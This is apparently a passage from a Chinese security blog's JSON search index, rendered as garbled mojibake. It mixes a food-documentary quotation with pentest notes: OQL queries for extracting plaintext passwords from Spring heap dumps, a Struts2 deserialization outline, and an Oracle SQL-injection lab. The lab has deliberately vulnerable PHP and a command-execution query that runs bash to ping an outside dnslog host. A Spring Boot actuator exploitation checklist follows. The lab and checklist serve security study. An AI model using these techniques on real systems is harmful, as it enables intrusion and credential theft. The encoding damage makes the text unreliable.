ä¸­å­˜åœ¨passwordå€¼å¹¶å±•ç¤ºå‡ºï¼Œå¦‚ä¸‹æ‰€ç¤ºè‡ªä¸å¿…å¤šè¯´ï¼šselect*fromorg.springframework.web.context.support.StandardServletEnvironmenté€‰æ‹©å¯»æ‰¾æ‰€æœ‰StandardServletEnvironmentå¹¶å±•ç¤ºå‡ºï¼Œè¿™ä¸€é¡¹ä¸­æˆ‘ä»¬éœ€è¦å…³æ³¨çš„æ˜¯propertySourceList(ç®€ç§°PPSlist)ï¼ŒæŸ¥æ‰¾é“¾å¦‚ä¸‹ï¼šPPS-PPSlis-array-org.springframework.core.env.PPS-source-tablesï¼Œtablesä¸­å­˜å‚¨çš„å³ä¸ºæˆ‘ä»¬æ‰€å…³æ³¨çš„æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼šselect*fromjava.util.Hashtable$EntryxWHERE(toString(x.key).contains(\"password\"))é€‰æ‹©å¯»æ‰¾å“ˆå¸Œè¡¨ä¸­æ‰€æœ‰keyå…ƒç´ ä¸­å­˜åœ¨passwordå€¼å¹¶å±•ç¤ºå‡ºï¼šæœ¬æ–‡ä¸­å±•ç¤ºçš„åˆ†æOQLè¯­å¥å®ä¾‹ä¾›å‚è€ƒï¼Œå®é™…å¯æ˜¯å†™å‡ºçš„æœ‰å¾ˆå¤šï¼Œç»è¿‡è‡ªå·±ç†è§£åå¯ä»¥è‡ªè¡Œå°è¯•ç¼–å†™å®è·µã€‚å‚è€ƒJDK1.8æºç (ä¹)â€”â€”java.util.LinkedHashMapç±»Mapç»¼è¿°ï¼ˆäºŒï¼‰ï¼šå½»å¤´å½»å°¾ç†è§£LinkedHashMapMATæŸ¥æ‰¾springheapdumpä¸­çš„å¯†ç æ˜æ–‡ä»¥ä¸Š"
  },

  {
    "title"    : "ã€ŠèˆŒå°–ä¸Šçš„ä¸­å›½ã€‹ç»å…¸è§£è¯´è¯",
    "category" : "daily",
    "tags"     : "",
    "url"      : "/daily/2020/daily-post-test-article/",
    "date"     : "Nov 11, 2020",
    "content"  : "ä¸œæ–¹å’Œè¥¿æ–¹ï¼Œæ±Ÿå—å’Œå¡åŒ—ã€‚äººä»¬çš„è¿å¾™ä¿ƒæˆäº†é£Ÿç‰©çš„ç›¸é€¢ï¼Œé£Ÿç‰©çš„ç¦»åˆè§è¯äº†äººçš„èšæ•£ã€‚åŠèº«é—¯è¡ï¼Œå¸¦æ¥å®¶ä¸šä¸°åšï¼Œå„¿å­™æ»¡å ‚ï¼Œè¡Œèµ°ä¸€ç”Ÿçš„è„šæ­¥ï¼Œèµ·ç‚¹ï¼Œç»ˆç‚¹ï¼Œå½’æ ¹åˆ°åº•éƒ½æ˜¯å®¶æ‰€åœ¨çš„åœ°æ–¹ï¼Œè¿™æ˜¯ä¸­å›½äººç§‰æŒåƒå¹´çš„ä¿¡ä»°ï¼Œæœ´ç´ ï¼Œä½†æœ‰åŠ›é‡ã€‚åœ¨å¨æˆ¿é‡Œï¼Œäº”å‘³çš„æœ€ä½³å­˜åœ¨æ–¹å¼ï¼Œå¹¶ä¸æ˜¯è®©å…¶ä¸­æœ‰æŸä¸€å‘³æ˜¾å¾—æ ¼å¤–çªå‡ºï¼Œè€Œæ˜¯äº”å‘³çš„è°ƒå’Œä»¥åŠå¹³è¡¡ï¼Œä¸ä»…æ˜¯ä¸­å›½å†ä»£å¨å¸ˆå’Œä¸­åŒ»ä¸æ–­å¯»æ±‚çš„å®Œç¾çŠ¶æ€ï¼Œä¹Ÿæ˜¯ä¸­å›½åœ¨ä¸ºäººå¤„ä¸–ã€ç”šè‡³åœ¨æ²»å›½ç»ä¸–ä¸Šæ‰€è¿½æ±‚çš„ç†æƒ³å¢ƒç•Œã€‚ä¼ æ‰¿ä¸­å›½æ–‡åŒ–çš„ä¸ä»…ä»…æ˜¯å”è¯—å®‹è¯äº¬å‰§æ˜†æ›²ï¼Œå®ƒåŒ…å«ç€ä¸æˆ‘ä»¬ç”Ÿæ´»ç›¸å…³çš„æ¯ä¸€ä¸ªç»†èŠ‚ã€‚ä¸€å‹ºé±¼é…±ï¼Œè¶³ä»¥è®©æœ€å¹³å¸¸çš„é£Ÿæé™¡ç„¶å˜å¾—é…¸æ¥šåŠ¨äººï¼Œè¿™æ˜¯ä¸€å¹´ä¸­æœ€ç¾å‘³çš„å›¢èšï¼Œä¹Ÿæ³¨å®šæ˜¯ä¸€é¡¿ç™¾æ„Ÿäº¤é›†çš„æ™šé¤ã€‚"
  },

  {
    "title"    : "Struts2Deser",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/Struts2Deser/",
    "date"     : "Nov 7, 2020",
    "content"  : "åˆ†äº«ï¼šStruts2ååºåˆ—åŒ–SHIROæ¡†æ¶ç®€ä»‹ä»¥åŠç›¸å…³ç”¨é€”âœ…ç®€ä»‹ï¼šå…³äºSTRUTS2çš„å†å²å’Œç›¸å…³å®ç°ç»„ä»¶âœ…ç”¨é€”ï¼šSTRUTS2æ¡†æ¶çš„ä½¿ç”¨åœºæ™¯å’Œè§£å†³ç—›ç‚¹ååºåˆ—åŒ–åˆ†æâœ…JAVAä»£ç ååºåˆ—åŒ–FRAMESâœ…è°ƒè¯•ç¯å¢ƒéƒ¨ç½²ä¸ºä»€ä¹ˆå†™è¿™æ ·çš„ä»£ç âå¼€å‘è€…å†™è¿™æ ·ä»£ç çš„ç”¨æ„âå¼€å‘è€…å¦‚ä½•ä¿®å¤ååºåˆ—åŒ–å®æˆ˜âœ…åˆ©ç”¨è¡¨è¾¾å¼è®¡ç®—æ³¨å…¥æ‰§è¡Œä»£ç âœ…æœ€ç»ˆç›®æ ‡ï¼šGETSHELL"
  },

  {
    "title"    : "SQLæ³¨å…¥åŸç†åˆ†æ",
    "category" : "about",
    "tags"     : "",
    "url"      : "/about/ALL-SQL-INJECTION-ANALYSIS/",
    "date"     : "Oct 29, 2020",
    "content"  : "SQLæ³¨å…¥åŸç†åˆ†æï¼šå…¨ç±»å‹æ•°æ®åº“é¶åœºæ­å»ºé›¶ï¼šOracleæ•°æ®åº“æ³¨å…¥é¶åœºæ­å»ºä½¿ç”¨dockerè¿›è¡Œoracleæ•°æ®åº“æ¸—é€æµ‹è¯•ï¼Œæµ‹è¯•ç¯å¢ƒæ‹“æ‰‘å¦‚ä¸‹ï¼š0x01ï¼šOracleæœåŠ¡å¯åŠ¨#Oracleæ•°æ®åº“é…ç½®ä¸€è§ˆæ•°æ®åº“é•œåƒå¯åŠ¨#dockerä¸‹è½½oracleæ•°æ®åº“é•œåƒdockerpullregistry.cn-hangzhou.aliyuncs.com/qida/oracle-xe-11g#dockerå°†é•œåƒåŠ è½½åˆ°åç§°ä¸ºoracleçš„å®¹å™¨åå°è¿è¡Œï¼Œå¹¶æ˜ å°„é•œåƒ1521ç«¯å£åˆ°æœ¬åœ°1521ç«¯å£dockerrun-d-p1521:1521--nameoracleregistry.cn-hangzhou.aliyuncs.com/qida/oracle-xe-11g#è¿›å…¥oracleå®¹å™¨çš„äº¤äº’å¼shelldockerexec-itoraclebashroot@bd849e50bab4:/#sqlplus/nologSQL&gt;connsys/oracleassysdbaConnected.SQL&gt;selectnamefromv$database;NAME---------XEæ–°å¢ç”¨æˆ·èµ‹æƒ+å»ºåº“#å¼€è¾Ÿç©ºé—´å»ºåº“SQL&gt;createtablespacepentestdatafile'/tmp/pentest.dbf'size100m;Tablespacecreated.#åˆ›å»ºpentestç”¨æˆ·ï¼Œå¯†ç pentestï¼›é»˜è®¤tableæ˜¯pentestSQL&gt;createuserpentestidentifiedbypentestdefaulttablespacepentest;Usercreated.#èµ‹æƒpentest-connect,resource,dbaSQL&gt;grantconnect,resource,dbatopentest;Grantsucceeded.SQL&gt;exitDisconnectedfromOracleDatabase11gExpressEditionRelease11.2.0.2.0-64bitProduction#pentestç”¨æˆ·è¿æ¥root@bd849e50bab4:/#sqlpluspentest/pentestSQL*Plus:Release11.2.0.2.0ProductiononFriFeb1906:38:042021Copyright(c)1982,2011,Oracle.Allrightsreserved.Connectedto:OracleDatabase11gExpressEditionRelease11.2.0.2.0-64bitProductionæ’å…¥æµ‹è¯•æ•°æ®#å»ºè¡¨SQL&gt;CREATETABLEusers(idnumber,namevarchar(500),surnamevarchar(1000));Tablecreated.#å¯¼å…¥æ•°æ®SQL&gt;INSERTINTOusers(id,name,surname)VALUES(1,'luther','blisset');INSERTINTOusers(id,name,surname)VALUES(2,'fluffy','bunny');INSERTINTOusers(id,name,surname)VALUES(3,'wu','ming');INSERTINTOusers(id,name,surname)VALUES(4,'sqlmap/1.0-dev(http://sqlmap.org)','useragentheader');INSERTINTOusers(id,name,surname)VALUES(5,NULL,'nameisnull');commit;1rowcreated.SQL&gt;1rowcreated.SQL&gt;1rowcreated.SQL&gt;1rowcreated.SQL&gt;1rowcreated.SQL&gt;commit;Commitcomplete.SQL&gt;SELECT*FROMuserswhereid=1;\tID----------NAME--------------------------------------------------------------------------------SURNAME--------------------------------------------------------------------------------\t1lutherblisset0x02ï¼šWEBæœåŠ¡å¯åŠ¨#APACHE+PHP+ORACLEdockeré•œåƒæ‹‰å–dockerpullthomasbisignani/docker-apache-php-oraclecd~/learn/dockermkdiroracle_samplePages&amp;&amp;cdoracle_samplePagestouchindex.php##########é…ç½®docker-apache-php-oracleè¿™ä¸ªé•œåƒå¯åŠ¨æ—¶ï¼š##1ã€-v:å®¿ä¸»æœºæ–‡ä»¶å¤¹/Users/bin4xin/learn/docker/oracle_samplePagesä¸­æ–‡ä»¶å¯åœ¨è™šæ‹Ÿæœºæ–‡ä»¶å¤¹/var/www/htmlä¸­è¢«è®¿é—®åˆ°ï¼›å³ï¼š########å®¿ä¸»æœº/Users/bin4xin/learn/docker/oracle_samplePagesæ–‡ä»¶å¤¹ä¸ºdocker-apache-php-oraclewebæœåŠ¡çš„æ ¹ç›®å½•##2ã€-p:æ˜ å°„docker80ç«¯å£åˆ°æœ¬æœºçš„8090ç«¯å£ä¸‹ï¼›##3ã€-d:åå°è¿è¡Œ########dockerrun-p8090:80-d-v/Users/bin4xin/learn/docker/oracle_samplePages:/var/www/htmlthomasbisignani/docker-apache-php-oraclephpè¿åº“ä»£ç catindex.php&lt;?php$username='pentest';$password='pentest';$connectText='//127.0.0.1:1521/XE';$conn=oci_connect($username,$password,$connectText);if(!$conn){$e=oci_error();echo'Oracleconnectfailed&lt;br/&gt;';exit($e['message']);}echo'Oracleconnectok'.\"&lt;br&gt;\";?&gt;PHPé¶åœºSQLæ³¨å…¥ä»£ç &lt;?php$username='pentest';$password='pentest';$connectText='//127.0.0.1:1521/XE';$conn=oci_connect($username,$password,$connectText);if(!$conn){$e=oci_error();echo'Oracleconnectfailed&lt;br/&gt;';exit($e['message']);}echo'Oracleconnectok'.\"&lt;br&gt;\";//Preparethestatementif(!isset($_GET['id'])||$_GET['id']==null){echo\"oraclesqlinjectiontest:oracle_test.php?id=1&lt;/br&gt;\";$stid=oci_parse($conn,\"select*fromUSERS\");}else{//SQLinjection!!!!!!$stid=oci_parse($conn,\"SELECT*FROMuserswhereid=\".$_GET['id']);}if(!$stid){$e=oci_error($conn);exit($e['message']);}//Performthelogicofthequery$r=oci_execute($stid);if(!$r){$e=oci_error($stid);exit($e['message']);}//Fetchtheresultsofthequeryprint\"&lt;tableborder='1'&gt;\\n\";while($row=oci_fetch_array($stid,OCI_ASSOC+OCI_RETURN_NULLS)){print\"&lt;tr&gt;\\n\";foreach($rowas$item){$item=($item!==null?mb_convert_encoding($item,'utf-8','gbk'):\"\");print\"&lt;td&gt;\".$item.\"&lt;/td&gt;\\n\";}print\"&lt;/tr&gt;\\n\";}print\"&lt;/table&gt;\\n\";oci_free_statement($stid);oci_close($conn);?&gt;#è¿åº“æˆåŠŸæ•ˆæœå›¾0x03ï¼šSQLæ³¨å…¥é¶åœºå¯åŠ¨è‡³æ­¤ï¼Œæ³¨å…¥é¶åœºæ­å»ºå®Œæ¯•ã€‚SQLMAPæ³¨å…¥æ•ˆæœï¼šæ¸—é€å¸¸ç”¨è¯­å¥ï¼š#å½“å‰ç”¨æˆ·æƒé™select*fromsession_roles#å½“å‰æ•°æ®åº“ç‰ˆæœ¬selectbannerfromsys.v_$versionwhererownum=1#æœåŠ¡å™¨å‡ºå£IPç”¨utl_http.requestå¯ä»¥å®ç°#æœåŠ¡å™¨ç›‘å¬IPåœ°å€selectutl_inaddr.get_host_addressfromdual#æœåŠ¡å™¨æ“ä½œç³»ç»Ÿselectmemberfromv$logfilewhererownum=1#æœåŠ¡å™¨sidæŸ¥è¯¢ï¼Œè¿œç¨‹è¿æ¥çš„è¯éœ€è¦selectinstance_namefromv$instance;#å½“å‰è¿æ¥ç”¨æˆ·selectSYS_CONTEXT('USERENV','CURRENT_USER')fromdualå‘½ä»¤æ‰§è¡Œï¼šSelectDBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','pingojuht0.dnslog.cn')fromdual;ä»¥ä¸Šã€‚"
  },

  {
    "title"    : "æœ‰å…³äºç½‘ç»œå®‰å…¨è¡Œä¸šçš„ä¸€äº›æ€è€ƒ",
    "category" : "",
    "tags"     : "ç¬”è®°",
    "url"      : "/blog/2020/think-about-cyber-security/",
    "date"     : "Sep 25, 2020",
    "content"  : "Underconstructionåœ¨å½“ä»Šç½‘ç»œå®‰å…¨è¡Œä¸šè¶‹äºå•†ä¸šåŒ–çš„æ—¶ä»£ï¼Œå¦‚ä½•èƒ½å¤Ÿä¿æŒä¸€é¢—èµ¤å¿±ä¹‹å¿ƒï¼šå½“ä»Šç½‘ç»œå®‰å…¨ä¹‹è¶‹åŠ¿ï¼Œå½“åœ¨å›½å®¶å®‰å…¨çš„å¤§å‰æä¸‹ï¼šæ•™è‚²è¡Œä¸šåº”ä½œä¸ºç½‘ç»œå®‰å…¨çš„â€æ´»æ°´æºå¤´â€ï¼Œä¸ºè¿™ä¸ªå¹´è½»çš„è¡Œä¸šè¾“å…¥è¶³å¤Ÿçš„å¹´è½»è¡€æ¶²ï¼Œæ‰€ä»¥åœ¨æ­¤åˆ»ï¼šåº”å½“å……åˆ†å‘æŒ¥æ•™è‚²èŒèƒ½çš„åŒæ—¶ï¼Œå¯¹å½“ä¸‹åº”ç”¨å‹ã€ç ”ç©¶å‹ä¸“ä¸šçš„è˜è˜å­¦å­åšæœ‰å¿…è¦çš„å¼•å¯¼ï¼›å› ä¸ºå½“ä¸‹å¾ˆå¤šå­¦ç”Ÿã€æ•™å¸ˆåœ¨å½“ä¸‹è¡Œä¸šæ— æ³•è®¤æ¸…è‡ªæˆ‘ï¼Œæ°¸è¿œæ— æ³•åœ¨æ­£ç¡®çš„æ—¶é—´ï¼Œåšæ­£ç¡®çš„äº‹ï¼›ä¼ä¸šåœ¨è¿™å…¶ä¸­ä¹Ÿæ‰®æ¼”é‡è¦è§’è‰²ï¼šæ˜¾è€Œæ˜“è§çš„æ˜¯ï¼Œä¼ ç»Ÿå®‰å…¨ä¼ä¸šä¹Ÿé¢ä¸´ç€çš„æŠ‰æ‹©ï¼šé€‚åº”å¸‚åœºæˆ–è€…æ˜¯è‡ªå·±é€‰æ‹©æ¸¸æˆè§„åˆ™ï¼›å¤§éƒ¨åˆ†ä¼ ç»Ÿå®‰å…¨å‚å•†é€‰æ‹©çš„æ˜¯é€‚åº”å¸‚åœºå®‰æœéœ€æ±‚ï¼›å¤ºæ——éœ€æ±‚ï¼›åº”ä»˜å·¥ä¿¡éƒ¨é—¨æ£€æŸ¥ç­‰ã€‚ã€‚ã€‚çˆ±åŠ å¯†ç­‰å‚å•†ï¼šè‡ªå·±åˆ›é€ éœ€æ±‚ï¼Œåˆ›é€ æ¸¸æˆè§„åˆ™ã€‚å¯¹å¤„äºå®ä¹ æœŸçš„å­¦ç”Ÿåšå¥½èŒä¸šå¼•å¯¼ï¼Œç½‘ç»œå®‰å…¨è¡Œä¸šåœ¨æœªæ¥åå¹´ä¸ä¼šæˆä¸ºå›½å®¶å‘½è„‰è¡Œä¸šï¼Œå®‰å…¨è¡Œä¸šä»…ä»…ä½œä¸ºå®‰å…¨æœåŠ¡çš„å½¢å¼ä¸ºå¤§ä¼—æ‰€ç†ŸçŸ¥ï¼Œå¦‚ä»Šçš„ç½‘ç»œå®‰å…¨è¡Œä¸šï¼šå›½å®¶å±‚é¢ï¼šCTFèµ›äº‹ï¼›æŠ¤ç½‘è¡ŒåŠ¨ï¼›é‡å¤§èŠ‚æ—¥ä¿éšœä¼ä¸šå±‚é¢ï¼šå·¥ä¿¡å±€éƒ¨é—¨æ£€æŸ¥ï¼›ç­‰ä¿ï¼›è‡ªèº«ä¼ä¸šä¸šåŠ¡å®‰å…¨ä¿éšœ(ä¸€èˆ¬æ¥è¯´ï¼Œè¶Šé’ˆå¯¹è‡ªèº«ä¼ä¸šä¸šåŠ¡æœ‰å®‰å…¨éœ€æ±‚çš„å…¬å¸ï¼Œéƒ½æ‹¥æœ‰è‡ªå·±çš„å®‰å…¨å›¢é˜Ÿ)ä¸ªäººå±‚é¢ï¼šä¸ªäººæ•°æ®ã€éšç§ã€è´¢äº§é—®é¢˜ï¼›é›¶ã€å½“ä¸‹ç½‘ç»œå®‰å…¨è¡Œä¸šCTFèµ›äº‹ä¹‹æˆ‘è§ooposï¼è¢«ä½ å‘ç°äº†ï¼itå·¥ä½œäººå‘˜ï¼ˆåŒ…æ‹¬è¿ç»´ã€å¼€å‘ç­‰ç­‰ï¼‰å…¬å¸å†…çš„çŸ›ç›¾è½¯ä»¶å¼€å‘å’Œä¼ ç»Ÿå®‰å…¨å…¬å¸ä¹‹é—´çš„çŸ›ç›¾ç½‘ç»œé˜²ç«å¢™ä½œä¸ºè®¿é—®æ§åˆ¶è®¾å¤‡ï¼Œä¸»è¦å·¥ä½œåœ¨OSIæ¨¡å‹ä¸‰ã€å››å±‚ï¼ŒåŸºäºIPæŠ¥æ–‡è¿›è¡Œæ£€æµ‹ã€‚åªæ˜¯å¯¹ç«¯å£åšé™åˆ¶ï¼Œå¯¹TCPåè®®åšå°å µã€‚å…¶äº§å“è®¾è®¡æ— éœ€ç†è§£HTTPä¼šè¯ï¼Œä¹Ÿå°±å†³å®šäº†æ— æ³•ç†è§£Webåº”ç”¨ç¨‹åºè¯­è¨€å¦‚HTMLã€SQLè¯­è¨€ã€‚å› æ­¤ï¼Œå®ƒä¸å¯èƒ½å¯¹HTTPé€šè®¯è¿›è¡Œè¾“å…¥éªŒè¯æˆ–æ”»å‡»è§„åˆ™åˆ†æã€‚é’ˆå¯¹Webç½‘ç«™çš„æ¶æ„æ”»å‡»ç»å¤§éƒ¨åˆ†éƒ½å°†å°è£…ä¸ºHTTPè¯·æ±‚ï¼Œä»80æˆ–443ç«¯å£é¡ºåˆ©é€šè¿‡é˜²ç«å¢™æ£€æµ‹ã€‚ä¸€äº›å®šä½æ¯”è¾ƒç»¼åˆã€æä¾›ä¸°å¯ŒåŠŸèƒ½çš„é˜²ç«å¢™ï¼Œä¹Ÿå…·å¤‡ä¸€å®šç¨‹åº¦çš„åº”ç”¨å±‚é˜²å¾¡èƒ½åŠ›ï¼Œå¦‚èƒ½æ ¹æ®TCPä¼šè¯å¼‚å¸¸æ€§åŠæ”»å‡»ç‰¹å¾é˜»æ­¢ç½‘ç»œå±‚çš„æ”»å‡»ï¼Œé€šè¿‡IPåˆ†æ‹†å’Œç»„åˆä¹Ÿèƒ½åˆ¤æ–­æ˜¯å¦æœ‰æ”»å‡»éšè—åœ¨å¤šä¸ªæ•°æ®åŒ…ä¸­ï¼Œä½†ä»æ ¹æœ¬ä¸Šè¯´ä»–ä»ç„¶æ— æ³•ç†è§£HTTPä¼šè¯ï¼Œéš¾ä»¥åº”å¯¹å¦‚SQLæ³¨å…¥ã€è·¨ç«™è„šæœ¬ã€cookieçªƒå–ã€ç½‘é¡µç¯¡æ”¹ç­‰åº”ç”¨å±‚æ”»å‡»ã€‚webåº”ç”¨é˜²ç«å¢™èƒ½åœ¨åº”ç”¨å±‚ç†è§£åˆ†æHTTPä¼šè¯ï¼Œå› æ­¤èƒ½æœ‰æ•ˆçš„é˜²æ­¢å„ç±»åº”ç”¨å±‚æ”»å‡»ï¼ŒåŒæ—¶ä»–å‘ä¸‹å…¼å®¹ï¼Œå…·å¤‡ç½‘ç»œé˜²ç«å¢™çš„åŠŸèƒ½ã€‚"
  },

  {
    "title"    : "ä¸å¾—ä¸è°ˆçš„ï¼šã€ŒSpring Bootã€æœªæˆæƒæ¸—é€",
    "category" : "",
    "tags"     : "src, CVE, ä¿¡æ¯æœé›†, ç¬”è®°",
    "url"      : "/blog/2020/Spring-boot/",
    "date"     : "Sep 25, 2020",
    "content"  : "å£°æ˜è¿™æ˜¯è½¬è½½åœ°å€ï¼Œè‹¥ä½œè€…ä»‹æ„è¯·è”ç³»ï¼šã€Œadministrator@sentrylab.cnã€åˆ é™¤è½¬è½½æ–‡ç« SpringBootVulnerabilityExploitCheckListSpringBootç›¸å…³æ¼æ´å­¦ä¹ èµ„æ–™ï¼Œåˆ©ç”¨æ–¹æ³•å’ŒæŠ€å·§åˆé›†ï¼Œé»‘ç›’å®‰å…¨è¯„ä¼°checklistBin4xinedited.SourcefromLandGreyé›¶ï¼šè·¯ç”±å’Œç‰ˆæœ¬0x01ï¼šè·¯ç”±çŸ¥è¯†SpringBoot1.xç‰ˆæœ¬é»˜è®¤å†…ç½®è·¯ç”±çš„æ ¹è·¯å¾„ä»¥/å¼€å§‹ï¼Œ2.xåˆ™ç»Ÿä¸€ä»¥/actuatorå¼€å§‹æœ‰äº›ç¨‹åºå‘˜ä¼šè‡ªå®šä¹‰/manageã€/managementæˆ–é¡¹ç›®ç›¸å…³åç§°ä¸ºæ ¹è·¯å¾„é»˜è®¤å†…ç½®è·¯ç”±åå­—ï¼Œå¦‚/envæœ‰æ—¶å€™ä¹Ÿä¼šè¢«ç¨‹åºå‘˜ä¿®æ”¹ï¼Œå¦‚ä¿®æ”¹æˆ/appenv0x02ï¼šç‰ˆæœ¬çŸ¥è¯†SpringCloudæ˜¯åŸºäºSpringBootæ¥è¿›è¡Œæ„å»ºæœåŠ¡ï¼Œå¹¶æä¾›å¦‚é…ç½®ç®¡ç†ã€æœåŠ¡æ³¨å†Œä¸å‘ç°ã€æ™ºèƒ½è·¯ç”±ç­‰å¸¸è§åŠŸèƒ½çš„å¸®åŠ©å¿«é€Ÿå¼€å‘åˆ†å¸ƒå¼ç³»ç»Ÿçš„ç³»åˆ—æ¡†æ¶çš„æœ‰åºé›†åˆã€‚å¸¸è§ç»„ä»¶çš„ç‰ˆæœ¬ç›¸äº’ä¾èµ–å…³ç³»ï¼šä¾èµ–é¡¹ç‰ˆæœ¬åˆ—è¡¨åŠä¾èµ–ç»„ä»¶ç‰ˆæœ¬spring-boot-starter-parentspring-boot-starter-parentspring-boot-dependenciesspring-boot-dependenciesspring-cloud-dependenciesspring-cloud-dependenciesSpringCloudä¸SpringBootå¤§ç‰ˆæœ¬ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼šSpringCloudSpringBootAngelå…¼å®¹SpringBoot1.2.xBrixtonå…¼å®¹SpringBoot1.3.xã€1.4.xCamdenå…¼å®¹SpringBoot1.4.xã€1.5.xDalstonå…¼å®¹SpringBoot1.5.xï¼Œä¸å…¼å®¹2.0.xEdgwareå…¼å®¹SpringBoot1.5.xï¼Œä¸å…¼å®¹2.0.xFinchleyå…¼å®¹SpringBoot2.0.xï¼Œä¸å…¼å®¹1.5.xGreenwichå…¼å®¹SpringBoot2.1.xHoxtonå…¼å®¹SpringBoot2.2.xSpringCloudå°ç‰ˆæœ¬å·çš„åç¼€åŠå«ä¹‰:ç‰ˆæœ¬å·åç¼€å«ä¹‰BUILD-SNAPSHOTå¿«ç…§ç‰ˆï¼Œä»£ç ä¸æ˜¯å›ºå®šï¼Œå¤„äºå˜åŒ–ä¹‹ä¸­MXé‡Œç¨‹ç¢‘ç‰ˆRCXå€™é€‰å‘å¸ƒç‰ˆRELEASEæ­£å¼å‘å¸ƒç‰ˆSRX(ä¿®å¤é”™è¯¯å’Œbugå¹¶å†æ¬¡å‘å¸ƒçš„)æ­£å¼å‘å¸ƒç‰ˆä¸€ï¼šä¿¡æ¯æ³„éœ²0x01ï¼šè·¯ç”±åœ°å€åŠæ¥å£è°ƒç”¨è¯¦æƒ…æ³„æ¼å¼€å‘ç¯å¢ƒåˆ‡æ¢ä¸ºçº¿ä¸Šç”Ÿäº§ç¯å¢ƒæ—¶ï¼Œç›¸å…³äººå‘˜æ²¡æœ‰æ›´æ”¹é…ç½®æ–‡ä»¶æˆ–å¿˜è®°åˆ‡æ¢é…ç½®ç¯å¢ƒï¼Œå¯¼è‡´æ­¤æ¼æ´ç›´æ¥è®¿é—®ä»¥ä¸‹å‡ ä¸ªè·¯ç”±ï¼ŒéªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨ï¼š/api-docs/v2/api-docs/swagger-ui.htmlä¸€äº›å¯èƒ½ä¼šé‡åˆ°çš„æ¥å£è·¯ç”±å˜å½¢ï¼š/api.html/sw/swagger-ui.html/api/swagger-ui.html/template/swagger-ui.html/spring-security-rest/api/swagger-ui.html/spring-security-oauth-resource/swagger-ui.htmlé™¤æ­¤ä¹‹å¤–ï¼Œä¸‹é¢çš„è·¯ç”±æœ‰æ—¶ä¹Ÿä¼šåŒ…å«(æˆ–æ¨æµ‹å‡º)ä¸€äº›æ¥å£åœ°å€ä¿¡æ¯ï¼Œä½†æ˜¯æ— æ³•è·å¾—å‚æ•°ç›¸å…³ä¿¡æ¯ï¼š/mappings/actuator/mappings/metrics/actuator/metrics/beans/actuator/beans/configprops/actuator/configpropsä¸€èˆ¬æ¥è®²ï¼ŒçŸ¥é“springbootåº”ç”¨çš„ç›¸å…³æ¥å£å’Œä¼ å‚ä¿¡æ¯å¹¶ä¸èƒ½ç®—æ˜¯æ¼æ´ï¼›ä½†æ˜¯å¯ä»¥æ£€æŸ¥æš´éœ²çš„æ¥å£æ˜¯å¦å­˜åœ¨æœªæˆæƒè®¿é—®ã€è¶Šæƒæˆ–è€…å…¶ä»–ä¸šåŠ¡å‹æ¼æ´ã€‚0x02ï¼šé…ç½®ä¸å½“è€Œæš´éœ²çš„è·¯ç”±ä¸»è¦æ˜¯å› ä¸ºç¨‹åºå‘˜å¼€å‘æ—¶æ²¡æœ‰æ„è¯†åˆ°æš´éœ²è·¯ç”±å¯èƒ½ä¼šé€ æˆå®‰å…¨é£é™©ï¼Œæˆ–è€…æ²¡æœ‰æŒ‰ç…§æ ‡å‡†æµç¨‹å¼€å‘ï¼Œå¿˜è®°ä¸Šçº¿æ—¶éœ€è¦ä¿®æ”¹/åˆ‡æ¢ç”Ÿäº§ç¯å¢ƒçš„é…ç½®å‚è€ƒproduction-ready-endpointså’Œspring-boot.txtï¼Œå¯èƒ½å› ä¸ºé…ç½®ä¸å½“è€Œæš´éœ²çš„é»˜è®¤å†…ç½®è·¯ç”±å¯èƒ½ä¼šæœ‰ï¼š/actuator/auditevents/autoconfig/beans/caches/conditions/configprops/docs/dump/env/flyway/health/heapdump/httptrace/info/intergrationgraph/jolokia/logfile/loggers/liquibase/metrics/mappings/prometheus/refresh/scheduledtasks/sessions/shutdown/trace/threaddump/actuator/auditevents/actuator/beans/actuator/health/actuator/conditions/actuator/configprops/actuator/env/actuator/info/actuator/loggers/actuator/heapdump/actuator/threaddump/actuator/metrics/actuator/scheduledtasks/actuator/httptrace/actuator/mappings/actuator/jolokia/actuator/hystrix.streamå…¶ä¸­å¯¹å¯»æ‰¾æ¼æ´æ¯”è¾ƒé‡è¦æ¥å£çš„æœ‰ï¼š/envã€/actuator/envGETè¯·æ±‚/envä¼šæ³„éœ²ç¯å¢ƒå˜é‡ä¿¡æ¯ï¼Œæˆ–è€…é…ç½®ä¸­çš„ä¸€äº›ç”¨æˆ·åï¼Œå½“ç¨‹åºå‘˜çš„å±æ€§åå‘½åä¸è§„èŒƒ(ä¾‹å¦‚passwordå†™æˆpsaswordã€pwd)æ—¶ï¼Œä¼šæ³„éœ²å¯†ç æ˜æ–‡ï¼›åŒæ—¶æœ‰ä¸€å®šæ¦‚ç‡å¯ä»¥é€šè¿‡POSTè¯·æ±‚/envæ¥å£è®¾ç½®ä¸€äº›å±æ€§ï¼Œè§¦å‘ç›¸å…³RCEæ¼æ´ã€‚/jolokiaé€šè¿‡/jolokia/listæ¥å£å¯»æ‰¾å¯ä»¥åˆ©ç”¨çš„MBeanï¼Œè§¦å‘ç›¸å…³RCEæ¼æ´ï¼›/traceä¸€äº›httpè¯·æ±‚åŒ…è®¿é—®è·Ÿè¸ªä¿¡æ¯ï¼Œæœ‰å¯èƒ½å‘ç°æœ‰æ•ˆçš„cookieä¿¡æ¯0x03ï¼šè·å–è¢«æ˜Ÿå·è„±æ•çš„å¯†ç çš„æ˜æ–‡(æ–¹æ³•ä¸€)è®¿é—®/envæ¥å£æ—¶ï¼Œspringactuatorä¼šå°†ä¸€äº›å¸¦æœ‰æ•æ„Ÿå…³é”®è¯(å¦‚passwordã€secret)çš„å±æ€§åå¯¹åº”çš„å±æ€§å€¼ç”¨*å·æ›¿æ¢è¾¾åˆ°è„±æ•çš„æ•ˆæœåˆ©ç”¨æ¡ä»¶ï¼šç›®æ ‡ç½‘ç«™å­˜åœ¨/jolokiaæˆ–/actuator/jolokiaæ¥å£ç›®æ 